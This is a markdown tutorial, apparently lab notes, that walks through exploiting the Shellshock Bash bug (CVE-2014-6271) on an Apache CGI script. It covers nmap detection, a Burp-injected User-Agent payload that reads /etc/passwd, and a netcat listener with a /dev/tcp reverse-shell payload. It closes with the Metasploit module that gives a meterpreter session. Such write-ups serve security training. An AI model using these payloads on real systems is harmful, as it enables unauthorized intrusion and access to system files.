# Exploiting Shellshock
>Shellshock, also known as Bashdoor, is a family of security bugs in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.
> 
> In the context of Apache web server, we can utilize any legitimate CGI scripts accessible on the server. Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash. This vulnerability can be exploited both manually (through a proxy like Burp) and automatically with the use of an MSF exploit module.
 
1. This vulnerability existed in older versions of Bash. 
2. In the context of remote exploitation, Apache web servers configured to run **_CGI scripts_** or **_.sh scripts_** are vulnerable to this attack.  
  a. The first service vulnerability: Apache  
  b. The second service vulnerability: Bash  

## Contents 
- [Intro](#intro)
  - [CVE-2014-6271 (Shellshock | Bashdoor)](#cve-2014-6271-shellshock--bashdoor)
  - [Shellshock Details](#shellshock-details)
  - [Shellshock Exploitation](#shellshock-exploitation)
- [Manual Exploit](#manual-exploit)
  - [Initial Scan & Observation](#initial-scan--observation)
  - [NSE: Check Vulnerability](#nse-check-vulnerability)
  - [Burp Suite](#burp-suite)
- [MetaSploit](#metasploit)

## Intro

### [CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271) (Shellshock | Bashdoor)
- Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since v1.3) that allow an attacker to execute remote arbitrary commands via Bash, consquently allowing the attacker to obtain remote access to the target system via a reverse shell.
- The Shellschock vulnerability was discovered by Stephane Chazelas on 09/12/2014 and was made public on 09/24/2014.
- Bash is a a *Nix shell that is part of the GNU project and is the default shell for most Linux distros.
- Not very common anymore since most distros have updated the Bash shell. But... you never know.

### Shellshock Details
- The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters:
```
( )  {  : ;  } ; echo; echo; [command];
```
- This vulnerability only affects Linux since Windows does not use Bash and since Windows is not a *Nix-based operating system.
- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
  - CGI: Common Gateway Protocol
  - CGI scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client (results displayed on the web site/page).
- In Apache, CGI scripts are executed (usually, by default) through a Bash shell.
  - Exploit: include the above trailing characters and follow that with malicious Bash script/code.
 
### Shellshock Exploitation
- **KEY:** In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.
- In the context of Apache web server, we can utilize any legitimate **_CGI scripts_** accessible on the server.
- Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.
  - If the version of Bash that runs the CGI script is vulnerable, you can exploit it.
- This vulnerability can be exploited both manually (through a proxy like Burp) and automatically with the use of an MSF exploit module.

## Manual Exploit
> The following is from a lab. All of the lab-specific context is retained in order to show the flow of execution, etc. 

### Initial Scan & Observation
- Start with a normal scan of your target system (`-sV`)
  - Apache http server on port 80 (and not much else)
  - confirm it with a broswer (open it up and look at it)
- OBSERVE: On the index page there is a dynamic countdown time stamp.
  - How do they get the time and the countdown to display?
  - This is being accomplished through the use of a CGI script.
  - "View Page Source" will show you the script that is called: `/gettime.cgi`
  - The initial forward slash lets us know the script is stored in the root directory of the web server.
    - This means the script is publicly accessible (just like index.html, et al, that sit in the root directory).
  - So do this: In the URL box of the browser: `[target ip]/gettime.cgi`
    - This will display the results of the script to the client.
    - **_The CGI script is executing commands with Bash_** and then displaying the results of the command executionin the browser window for the client.

### NSE: Check Vulnerability
- Check to see if the server is vulnerable to the Shellshock attack with an NSE script.
```
nmap -sV --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" [target ip]
# or (both work the same)
nmap -sV --script http-shellshock --script-args uri=/gettime.cgi  [target ip]
```

### Burp Suite
> We are going to test the target machine first to see if the vulnerability exists.
> Then we are going to get a reverse shell on the target system. 

#### Start the Proxy & Burp
- Use the FoxyProxy Firefox extension to turn the browser proxy on and off.
  - This sets BurpSuite as a proxy and all traffic through Firefox (between Firefox and the target) will go through Burp.
- Open BurpSuite: Kali menu... Web Application Analysis... BurpSuite.
  - "Next" on the Temporary Project
  - "Start Burp" (with default configs)
  - Disregard the nag pop-up
- In Burp: Click on the "Proxy" tab and check to make sure "Intercept is on" is ON.
  - You can "Forward" anything sitting in queue before we get going.

#### Back to Firefox
- Reload the cgi script (the page: `[target ip]/gettime.cgi`)
- This will GET the page and hold it in the proxy (Burp) until we forward it to the browser

#### Burp Grabbed the Request
- Go back into Burp and you should see the proxy grabbed it.
- We are going to be injecting our special characters into the http header.
- Right-click in the "Raw" tab (where your request was held in queue) and "Send to Repeater"
- Click on the "Repeater" tab

#### Burp :: Repeater
- In the Repeater tab in Burp: delete the current "User-Agent:" information (following the colon, not "User-Agent:").
- Replace that with our own command.  EXAMPLE
- Type in: `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`
- Send that request with Repeater by clicking the "Send" button.
- You should see a Reponse in the Response window on the right side of the Repeater screen
  - If it worked, you should see the contents of the passwd file on the target displayed in the Response window of Repater in Burp.
 
#### Reverse Shell: Listener
- Set up your listener:
```
nc -nvlp 1234
```
- `-n`        no DNS lookups (we're using IPs, not domain names)
- `-v`        verbose output
- `-l`        listener
- `-p 1234`   port the listener should listen on for incoming calls...

#### Reverse Shell: Burp
- Back in Burp, send the comand for the reverse shell:
```
User-Agent: () { :; }; echo; echo; /bin/bash/ -c 'bash -i >&/dev/tcp/[kali ip]/1234 0>&1'
```
- Initialate an interactive Bash session and send it to our Kali listener; the redirect stdin (keyboard) to the same destination as stdout (display; which has been sent to our Kali listener).

#### Reverse Shell: Kali
- Back in your Kali attack machine, you should have an interactive Bash shell on the target machine. Some commands to run to figure out what you have: `whoami`, `cat /etc/*issue`, `cat /etc/release`, `uname -a`

## MetaSploit
- Crank up msfconsole and the postgresql db if needed. Remember to turn off FoxyProxy and close Burp
```
service postgresql status|start
msfconsole
> search shellshock
  # The auxiliary module is a scanner that will tell you whether or not the server is vulnerable to Shellshock
  # The exploit module for "Variable Code Injection"
  # use the exploit module: exploit/multi/http/apache_mod_cgi_bash_env_exec
> show options
  # You need to set RHOSTS to [target ip]
  # You need to set TARGETURI to    /gettime.cgi
  # Everything else should be okay with defaults
> run
  # That should give you a meterpreter session on the target system
  # Check with sysinfo and getuid
```
- Your next practical step would be privilege escalation. 
